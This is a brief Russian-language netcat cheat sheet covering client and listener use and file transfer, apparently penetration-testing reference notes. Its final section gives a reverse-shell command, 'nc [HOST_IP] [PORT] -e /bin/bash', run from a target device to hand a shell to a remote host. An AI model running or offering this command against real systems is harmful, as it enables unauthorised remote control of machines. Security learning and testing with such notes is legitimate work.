
# Netcat

Подробный справочник доступен здесь: [https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)

`nc` может использоваться как сокращение для `netcat` на некоторых устройствах.

## Базовый клиент

То есть подключение к произвольному порту на IP-адресе:

```bash
$ nc [IP] [PORT]
```

## Базовый слушатель

То есть прием соединений на произвольном порту:

```bash
$ nc -lp [PORT]
```

## Передача файлов

Настройте слушатель на хосте, который отправляет файл в выходной файл:

```bash
$ nc -lp [PORT] > /path/to/outfile
```

От клиента (дистанционного устройства), отправьте файл обратно в слушатель:

```bash
$ nc -w3 [IP] [PORT] < /path/to/infile
```

## Отправка обратного шелла

От целевого устройства:

```bash
$ nc [HOST_IP] [PORT] -e /bin/bash
```

# Теги

#cheat-sheet
